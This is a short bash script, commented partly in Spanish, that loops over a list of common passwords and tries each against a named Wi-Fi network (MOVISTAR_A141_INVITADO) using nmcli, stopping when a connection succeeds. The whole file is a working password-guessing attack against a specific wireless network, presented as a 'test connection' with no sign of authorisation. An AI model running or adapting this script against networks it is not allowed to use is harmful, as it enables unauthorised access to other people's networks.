#!/bin/bash

#
# This script is working on:
# Manjaro Linux x86_64
# Shell: bash 5.2.37
#

ssid="MOVISTAR_A141_INVITADO"
passwords=("123456" "1q2w3e" "123456789") # List of password to try
attempt=1  # counter

echo "Starting the test connection for SSID: $ssid"
echo "========================================="

for password in "${passwords[@]}"; do
    echo "Attempt # $attempt: SSID='$ssid', Password='$password'"

    # Intentar conectar
    nmcli dev wifi connect "$ssid" password "$password" &> /dev/null

    # Verificar si la conexión fue exitosa
    if nmcli -t -f active,ssid dev wifi | grep -q "^yes:$ssid$"; then
        echo "¡Connection succefull"
        break
    else
        echo "Wrong password."
    fi

    ((attempt++))  # Incrementar contador de intentos
done

echo "Testing process completed."
